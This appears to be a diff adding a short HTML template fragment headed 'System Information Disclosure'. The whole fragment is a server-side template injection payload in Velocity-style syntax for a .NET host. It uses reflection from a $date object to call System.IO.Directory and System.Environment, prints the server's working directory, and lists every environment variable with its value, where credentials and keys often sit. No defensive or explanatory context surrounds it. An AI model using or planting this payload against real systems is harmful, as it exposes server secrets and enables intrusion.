@@ -1,0 +1,8 @@
+<h2>System Information Disclosure</h2>
+<p>Current Directory: $date.GetType().Assembly.GetType("System.IO.Directory").GetMethod("GetCurrentDirectory").Invoke($null, $null)</p>
+<p>Environment Variables:</p>
+<ul>
+#foreach($env in $date.GetType().Assembly.GetType("System.Environment").GetMethod("GetEnvironmentVariables", [System.Type]::EmptyTypes).Invoke($null, $null))
+    <li>$env.Key = $env.Value</li>
+#end
+</ul>
